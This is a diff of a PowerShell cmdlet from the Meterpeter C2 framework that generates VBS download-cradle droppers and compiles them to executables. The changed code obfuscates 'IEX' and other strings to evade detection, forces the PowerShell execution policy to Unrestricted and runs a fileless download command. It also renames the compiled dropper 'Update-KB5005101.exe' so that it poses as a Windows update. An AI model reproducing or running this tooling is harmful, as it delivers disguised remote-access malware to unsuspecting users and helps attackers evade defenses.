@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: .NET\Framework\v4.0.30319\vbc.exe
-   PS cmdlet Dev version: v1.2.18
+   PS cmdlet Dev version: v1.2.19
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allows Meterpeter C2 v2.10.14
@@ -156,9 +156,11 @@ If($Egg -ieq "false")
 
    ## Dispaly OnScreen ( CmdLet Manul execution )
    write-host "*" -ForegroundColor Green -NoNewline
-   write-host " Creating '" -NoNewline
+   write-host " Creating " -NoNewline
    write-host "$VbsName" -ForegroundColor Green -NoNewline
-   write-host "' [$Action]"
+   write-host " [" -NoNewline
+   write-host "$Action" -ForegroundColor DarkGray -NoNewline
+   write-host "]"
 }
 
 ## List Of Download Crandle Technics ( download crandles - download \ fileless )
@@ -455,27 +457,22 @@ Else
 }
 
 
-## TODO: Inte`ropSer`vices = [a]msi
-#  TODO: delete Imports and test if exe executes well ?
-#  TODO: use vbsencoder.vbs on this template [meterpeter] ?
+##  TODO: use vbsencoder.vbs on this template.vbs [meterpeter] ?
 $ShantyDamaianti = "@S£y's£t@em£.@R£'u@nt£im@e.I@n£t@er'o@pS@er£v'i@£ce£s" -replace '(@|£|'')',''
-
-$VBStoExe = @("Imports System
-Imports $ShantyDamaianti
-Public Module Whatever
+$VBStoExe = @("Public Module Whatever
 
 Sub Main
-   Dim SSLProvider As Object
-   SSLProvider = CreateObject(`"Wscript.Shell`")
+   Dim ObjSSLProvider As Object
+   ObjSSLProvider = CreateObject(`"Wscript.Shell`")
 
-   dIm $Apii,Cmd,Layback,Restricted,visible,ttl,InvokeMe
+   dIm $Apii,Cmd,Layback,Restricted,Overlord,Serafin
    $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-   ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
-   Layback=rEpLaCe($Apii, `"@!`", `"`")
-   Cmd=rEpLaCe(Layback, `":007:`", `"`")
+   Overlord=`"I@`":Serafin=rEpLaCe(Overlord, `"@`", `"EX`")
+   Layback = rEpLaCe($Apii, `"@!`", `"`")
+   Cmd = rEpLaCe(Layback, `":007:`", `"`")
 
    Restricted=`"UnRestricted`"
-   SSLProvider.run(`"cmd /R echo Y|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $CrandleCmdLine`")
+   ObjSSLProvider.Exec(`"cmd /R echo Y|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $CrandleCmdLine`")
 end sub
 End Module")
 
@@ -494,7 +491,7 @@ End Module")
       write-host " Storage: " -NoNewline
       write-host "${pwd}\${VbsName}" -ForegroundColor Green # Download_Crandle.vbs
 
-      $CrandleExeName = $VbsName -replace '.vbs','.exe' # Download_Crandle.vbs - Download_Crandle.exe
+      $CrandleExeName = $PayloadName -replace '.ps1','.exe' # Update-KB5005101.ps1 - Update-KB5005101.exe
       $CmdLineToExecute = "@C:\W@in£'do@w£s\M@i£c'r@os£o@ft.£N£E@T\F@r£am'@'ew£o@r£k\v£4.@0'.3£0@'31£9\v@b£c.e@x'£'e" -replace '(@|£|'')',''
 
       ## Compiling VBS file to EXE format
@@ -507,32 +504,28 @@ End Module")
          ## Make sure meterpeter.ico exits
          If(Test-Path -Path "meterpeter.ico")
          {
-            $IconFile = "meterpeter.ico"
-            write-host "  > " -NoNewline
-            write-host "Compiling dropper.VBS to dropper.EXE" -ForegroundColor Green
-            Start-Sleep -Seconds 1;write-host "  > " -NoNewline
-            write-host "Invoking fileless technic " -ForegroundColor Green -NoNewline
+            write-host "  > Compiling dropper.VBS to dropper.EXE" -ForegroundColor Green
+            Start-Sleep -Seconds 1
+            write-host "  > Invoking fileless technic " -ForegroundColor Green -NoNewline
             write-host "$Technic" -ForegroundColor DarkRed
 
             ## COMPILE VBS TO EXE [with meterpeter icon]
-            Start-Process -WindowStyle Hidden powershell -ArgumentList "$CmdLineToExecute /nologo /quiet /target:exe /win32icon:`"$IconFile`" /out:`"$CrandleExeName`" `"$VbsName`" /platform:anyCPU" -Wait
-            write-host "  > " -NoNewline
-            write-host "Adding meterpeter appl icon to program" -ForegroundColor Green
+            Start-Process -WindowStyle Hidden powershell -ArgumentList "$CmdLineToExecute /nologo /quiet /target:exe /win32icon:`"meterpeter.ico`" /out:`"$CrandleExeName`" `"$VbsName`" /platform:anyCPU" -Wait
+            write-host "  > Adding meterpeter appl icon to program" -ForegroundColor Green
 
             write-host "*" -ForegroundColor Green -NoNewline
             write-host " Storage: " -NoNewline
-            write-host "${pwd}\${CrandleExeName}`n" -ForegroundColor Green # Download_Crandle.exe
+            write-host "${pwd}\${CrandleExeName}`n" -ForegroundColor Green # Update-KB5005101.exe
 
-            ## It leaves Download_Crandle.exe in current directory with meterpeter icon
+            ## It leaves Update-KB5005101.exe in current directory with meterpeter icon incorporated
             Remove-Item -Path "meterpeter.ico" -Force
             Remove-Item -Path "$VbsName" -Force
          }
          Else
          {
-            write-host "  > " -NoNewline
-            write-host "Compiling dropper.VBS to dropper.EXE" -ForegroundColor Green
-            Start-Sleep -Seconds 1;write-host "  > " -NoNewline
-            write-host "Invoking fileless technic " -ForegroundColor Green -NoNewline
+            write-host "  > Compiling dropper.VBS to dropper.EXE" -ForegroundColor Green
+            Start-Sleep -Seconds 1
+            write-host "  > Invoking fileless technic " -ForegroundColor Green -NoNewline
             write-host "$Technic" -ForegroundColor DarkRed
 
             ## COMPILE VBS TO EXE [no icon]
@@ -540,24 +533,31 @@ End Module")
 
             write-host "*" -ForegroundColor Green -NoNewline
             write-host " Storage: " -NoNewline
-            write-host "${pwd}\${CrandleExeName}`n" -ForegroundColor Green # Download_Crandle.exe
+            write-host "${pwd}\${CrandleExeName}`n" -ForegroundColor Green # Update-KB5005101.exe
 
-            ## It leaves Download_Crandle.exe in current directory
+            ## It leaves Update-KB5005101.exe in current directory
             Remove-Item -Path "$VbsName" -Force
          }
       }
       Else
       {
-         write-host "*" -ForegroundColor Green -NoNewline
-         write-host " Storage: " -NoNewline
-         write-host "${pwd}\${VbsName}" -ForegroundColor Green # Download_Crandle.vbs
-         write-host "  x error  : fail to compile '$VbsName' to '$CrandleExeName'" -ForegroundColor Red
-         write-host "  x missing: $CmdLineToExecute`n" -ForegroundColor DarkYellow
+         write-host "  x " -ForegroundColor Red -NoNewline
+         write-host "error  : fail to compile " -NoNewline
+         write-host "$VbsName" -ForegroundColor Red -NoNewline
+         write-host " to " -NoNewline
+         write-host "$CrandleExeName" -ForegroundColor Red
+
+         write-host "  x " -ForegroundColor Red -NoNewline
+         write-host "missing: " -NoNewline
+         write-host "$CmdLineToExecute`n" -ForegroundColor Red
+
+         ## CleanUP
+         Remove-Item -Path "$VbsName" -Force # Download_Crandle.vbs
       }
    }
 
    ## It leaves Download_Crandle.vbs in current directory
-   # If not compiled (or fail to compile) to binary.EXE
+   # If invoked using meterpeter C2 framework tool
    Exit
 }
 
